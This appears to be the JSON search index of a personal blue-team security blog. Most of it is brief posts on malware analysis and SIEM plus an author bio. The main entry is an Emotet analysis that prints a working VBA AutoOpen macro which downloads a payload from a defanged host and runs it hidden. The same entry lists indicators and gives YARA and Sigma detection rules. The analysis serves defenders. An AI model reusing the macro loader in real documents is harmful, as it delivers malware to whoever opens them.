[{"content":" Static vs Dynamic Analysis Malware analysis is divided into two primary techniques: static and dynamic analysis.\nComparison: Static Analysis Dynamic Analysis Code inspection without execution Analyzing malware behavior in execution Fast and lightweight Requires sandbox environment Cannot detect obfuscated code Can bypass obfuscation Understanding when to use each method is key to effective malware analysis. üîç\n","permalink":"http://localhost:35527/posts/static-vs-dynamic-malware-analysis/","summary":"Static vs Dynamic Analysis Malware analysis is divided into two primary techniques: static and dynamic analysis.\nComparison: Static Analysis Dynamic Analysis Code inspection without execution Analyzing malware behavior in execution Fast and lightweight Requires sandbox environment Cannot detect obfuscated code Can bypass obfuscation Understanding when to use each method is key to effective malware analysis. üîç","title":"Static vs Dynamic Malware Analysis"},{"content":" Why SIEM is Critical Security Information and Event Management (SIEM) platforms are essential for monitoring and responding to security events.\nTopics Covered: Setting up custom detection rules Correlating security events for better visibility Tuning SIEM to reduce false positives Effective SIEM rules can significantly improve your detection capabilities. üõ°Ô∏è\n","permalink":"http://localhost:35527/posts/mastering-siem-building-effective-detection-rules/","summary":"Why SIEM is Critical Security Information and Event Management (SIEM) platforms are essential for monitoring and responding to security events.\nTopics Covered: Setting up custom detection rules Correlating security events for better visibility Tuning SIEM to reduce false positives Effective SIEM rules can significantly improve your detection capabilities. üõ°Ô∏è","title":"Mastering Siem: Building Effective Detection Rules"},{"content":" Introduction Cyber threats are becoming more sophisticated, requiring better detection and response capabilities. This post explores common threat vectors and how to analyze them effectively.\nKey Points: Common malware techniques used in the wild How to detect malware using dynamic analysis Understanding rootkit behavior in kernel-level attacks Stay tuned for more insights! üöÄ\n","permalink":"http://localhost:35527/posts/exploring-threats-and-malware-in-the-wild/","summary":"Introduction Cyber threats are becoming more sophisticated, requiring better detection and response capabilities. This post explores common threat vectors and how to analyze them effectively.\nKey Points: Common malware techniques used in the wild How to detect malware using dynamic analysis Understanding rootkit behavior in kernel-level attacks Stay tuned for more insights! üöÄ","title":"Exploring Threats and Malware in the Wild"},{"content":"Executive Summary Emotet is a sophisticated banking trojan that has evolved into a modular malware distribution platform. This analysis reveals its multi-stage infection process, advanced evasion techniques, and ability to deliver additional payloads like TrickBot and Ryuk ransomware. The sample shows significant improvements in anti-analysis capabilities compared to earlier variants.\nThreat Level: Critical\nFamily: Emotet\nAliases: Heodo, Feodo\nDiscovered: Initially 2014, this variant from January 2023\nPlatform: Windows\nSample Information Attribute Value File Name invoice_29381.doc File Size 283 KB MD5 5d2bfc7ce9f3d69c559daf9f0f95a8b7 SHA1 7c086c09c2b8322d5f094a59c2d23dec18cfa1fc SHA256 a5b68ef45d76d647d80f3134d43c0aee3b099dae63aaa940af59cb7c9e01c847 File Type MS Word Document with Malicious Macros Compilation Timestamp N/A (Document) Initial Analysis Distribution Method This Emotet sample was distributed through a phishing email campaign with the subject line \u0026ldquo;Outstanding Invoice #29381\u0026rdquo;. The email contained an attachment named \u0026ldquo;invoice_29381.doc\u0026rdquo; which prompts users to enable macros to view the content.\nIndicators of Compromise (IOCs) Files: %TEMP%\\invoice_29381.doc %APPDATA%\\Microsoft[random-string].exe %SYSTEMROOT%\\System32\\Tasks\\Microsoftupdate[random-number] Registry: HKCU\\Software\\Microsoft\\Office[version]\\Word\\Security\\AccessVBOM = 1 HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Schedule\\TaskCache\\Tasks[TaskGUID] Network: Multiple C2 domains (see IOC List section) Other: Scheduled task creation for persistence PowerShell obfuscated command execution Technical Analysis Capabilities Steals banking credentials and financial information Harvests email credentials Exfiltrates contact lists for spreading via existing email threads Downloads and executes additional malware payloads Establishes persistence via registry and scheduled tasks Uses encrypted C2 communications Code Analysis The malicious document contains VBA macros that execute when enabled by the user:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 Sub AutoOpen() Dim xHttp: Set xHttp = CreateObject(\u0026#34;Microsoft.XMLHTTP\u0026#34;) Dim bStrm: Set bStrm = CreateObject(\u0026#34;Adodb.Stream\u0026#34;) myURL = \u0026#34;hxxp://compromised-server.com/payload.bin\u0026#34; xHttp.Open \u0026#34;GET\u0026#34;, myURL, False xHttp.Send With bStrm .Type = 1 .Open .write xHttp.responseBody .savetofile Environ(\u0026#34;TEMP\u0026#34;) \u0026amp; \u0026#34;\\temp_\u0026#34; \u0026amp; RandomString(8) \u0026amp; \u0026#34;.exe\u0026#34;, 2 End With Shell Environ(\u0026#34;TEMP\u0026#34;) \u0026amp; \u0026#34;\\temp_\u0026#34; \u0026amp; RandomString(8) \u0026amp; \u0026#34;.exe\u0026#34;, vbHide End Sub Function RandomString(Length As Integer) Dim i As Integer, Temp As String For i = 1 To Length Temp = Temp \u0026amp; Chr(Int((90 - 65 + 1) * Rnd + 65)) Next i RandomString = Temp End Function The macro downloads a binary payload from a compromised website and executes it. This first-stage loader then:\nDecrypts and injects the main Emotet module into a legitimate Windows process Uses API hooking to evade detection Establishes persistence through a scheduled task Anti-Analysis Techniques Heavily obfuscated code with junk functions and string encryption Detects virtual machines by checking for VM-specific registry keys, files, and processes Employs timing checks to detect debugging environments Uses process injection to hide in legitimate Windows processes Implements anti-sandbox techniques including human interaction checks Network Communications Protocol: Custom over HTTP/HTTPS Encryption: Custom encryption using RC4 with dynamic keys C2 Infrastructure: Uses a tiered botnet architecture with multiple fallback servers Primary C2 domains are rotated frequently Communications include system information, task requests, and data exfiltration Uses a domain generation algorithm (DGA) as a backup communication method Mitigation \u0026amp; Remediation Detection YARA Rule:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 rule Emotet_Doc_Macro_2023 { meta: description = \u0026#34;Detects Emotet malicious document with macros\u0026#34; author = \u0026#34;Beta Blue Gate\u0026#34; date = \u0026#34;2023-01-15\u0026#34; strings: $header = { D0 CF 11 E0 A1 B1 1A E1 } // OLE document header $macro1 = \u0026#34;AutoOpen\u0026#34; ascii nocase $macro2 = \u0026#34;Document_Open\u0026#34; ascii nocase $download = \u0026#34;Microsoft.XMLHTTP\u0026#34; ascii nocase $download2 = \u0026#34;Adodb.Stream\u0026#34; ascii nocase $suspicious1 = \u0026#34;Shell\u0026#34; ascii nocase $suspicious2 = \u0026#34;Environ(\u0026#34; ascii nocase $suspicious3 = \u0026#34;.savetofile\u0026#34; ascii nocase condition: $header at 0 and (($macro1 or $macro2) and ($download or $download2) and 2 of ($suspicious*)) } SIGMA Rule:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 title: Emotet Document Macro Execution id: 5a3293ac-5277-4413-8772-57c43b2f3cc3 status: experimental description: Detects the execution pattern of Emotet document macros author: Beta Blue Gate date: 2023/01/15 logsource: product: windows service: sysmon detection: selection: EventID: 1 Image|endswith: - \u0026#39;\\WINWORD.EXE\u0026#39; - \u0026#39;\\excel.exe\u0026#39; CommandLine|contains: \u0026#39;/Automation\u0026#39; process_creation: EventID: 1 ParentImage|endswith: - \u0026#39;\\WINWORD.EXE\u0026#39; - \u0026#39;\\excel.exe\u0026#39; Image|endswith: - \u0026#39;\\cmd.exe\u0026#39; - \u0026#39;\\powershell.exe\u0026#39; condition: selection and process_creation falsepositives: - Legitimate macro usage with command execution level: high Remediation Steps Isolate affected systems from the network immediately Remove persistence mechanisms: Delete scheduled tasks associated with Emotet Remove registry entries mentioned in IOCs Clean infected files: Delete malicious executables in %APPDATA% and %TEMP% directories Remove malicious document from user\u0026rsquo;s download folder/email Scan system with updated antivirus and EDR tools Reset all credentials accessed from the infected system Monitor network traffic for C2 communication attempts Implement email filtering to block malicious document attachments Conclusion This Emotet variant demonstrates the continuing evolution of this threat, with enhanced anti-analysis techniques and a multi-stage infection process. Its ability to deliver secondary payloads makes it a significant threat to organizations, potentially leading to data theft, financial fraud, or ransomware infections. The modular nature of Emotet makes it adaptable and persistent, requiring comprehensive security measures for prevention and detection.\nReferences CISA Alert AA20-280A: Emotet Malware MITRE ATT\u0026amp;CK: Emotet Malware Analysis Report - Emotet Evolution 2023 Q1 Emotet Technical Deep-Dive IOC List 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 # File Hashes (SHA256) a5b68ef45d76d647d80f3134d43c0aee3b099dae63aaa940af59cb7c9e01c847 e8c3a8b6e3763d81027aa35a1a6a8e0c13054c1a977aa719abf14bdd6f585d24 f1bff3d62ad2af7cbe5a5518618710a6f92a4ea3f0ec5df6258e528baa1d5978 # Domains morrishillconstruction.com/wp-admin/js/57839/ ezlabsdirect.com/css/86743/ earlyyearsbooks.co.uk/wp-content/languages/94756/ bestcrosses.ru/cgi-bin/19275/ bmsautomation.com/wp-admin/css/87365/ # IPs 45.153.241[.]209 192.185.128[.]183 160.153.128[.]158 184.168.221[.]41 103.75.201[.]2 # YARA Rule rule Emotet_Payload_2023 { meta: description = \u0026#34;Detects Emotet payload 2023 variant\u0026#34; author = \u0026#34;Beta Blue Gate\u0026#34; date = \u0026#34;2023-01-15\u0026#34; strings: $s1 = { 48 8B C4 48 89 58 08 48 89 68 10 48 89 70 18 48 89 78 20 41 56 48 83 EC 30 } $s2 = { 83 F9 22 0F 85 ?? ?? ?? ?? 45 33 C9 } $s3 = \u0026#34;GetCommandLineA\u0026#34; $s4 = \u0026#34;LoadLibraryA\u0026#34; $s5 = \u0026#34;GetProcAddress\u0026#34; $s6 = \u0026#34;VirtualAlloc\u0026#34; $s7 = \u0026#34;VirtualProtect\u0026#34; condition: uint16(0) == 0x5A4D and filesize \u0026lt; 500KB and $s1 and (all of ($s3, $s4, $s5, $s6, $s7)) and $s2 } ","permalink":"http://localhost:35527/posts/emotet-analysis/","summary":"Executive Summary Emotet is a sophisticated banking trojan that has evolved into a modular malware distribution platform. This analysis reveals its multi-stage infection process, advanced evasion techniques, and ability to deliver additional payloads like TrickBot and Ryuk ransomware. The sample shows significant improvements in anti-analysis capabilities compared to earlier variants.\nThreat Level: Critical\nFamily: Emotet\nAliases: Heodo, Feodo\nDiscovered: Initially 2014, this variant from January 2023\nPlatform: Windows\nSample Information Attribute Value File Name invoice_29381.","title":"Emotet Analysis"},{"content":"üëã Hi, I\u0026rsquo;m Febrian Tisna I\u0026rsquo;m passionate about Cyber Security, focusing on Blue Teaming and Malware Analysis.\nüöÄ My Background: üõ°Ô∏è Completed SOC Blue Team Bootcamp at Hacktrace üèÜ Achieved Rank 7 in Hacktrace Ranges Defensive Lab üîé Skilled in Malware Analysis (Static and Dynamic), PCAP Analysis, and SIEM üíª Exploring Red Teaming to strengthen my defense skills üß† Current Focus: Building a personal blog focused on Blue Teaming and Red Teaming at pepbritisnasetiawan.github.io üåê Find Me Here: üîó GitHub üîó LinkedIn üìß Email \u0026ldquo;Security is not a product, but a process.\u0026rdquo;\n","permalink":"http://localhost:35527/about/","summary":"üëã Hi, I\u0026rsquo;m Febrian Tisna I\u0026rsquo;m passionate about Cyber Security, focusing on Blue Teaming and Malware Analysis.\nüöÄ My Background: üõ°Ô∏è Completed SOC Blue Team Bootcamp at Hacktrace üèÜ Achieved Rank 7 in Hacktrace Ranges Defensive Lab üîé Skilled in Malware Analysis (Static and Dynamic), PCAP Analysis, and SIEM üíª Exploring Red Teaming to strengthen my defense skills üß† Current Focus: Building a personal blog focused on Blue Teaming and Red Teaming at pepbritisnasetiawan.","title":"About"},{"content":"test\n","permalink":"http://localhost:35527/posts/malware-analysis-hun/","summary":"test","title":"Malware Analysis Hun"},{"content":" This is the content of my first blog post!\n","permalink":"http://localhost:35527/posts/first-post/","summary":"This is the content of my first blog post!","title":"First Post"}]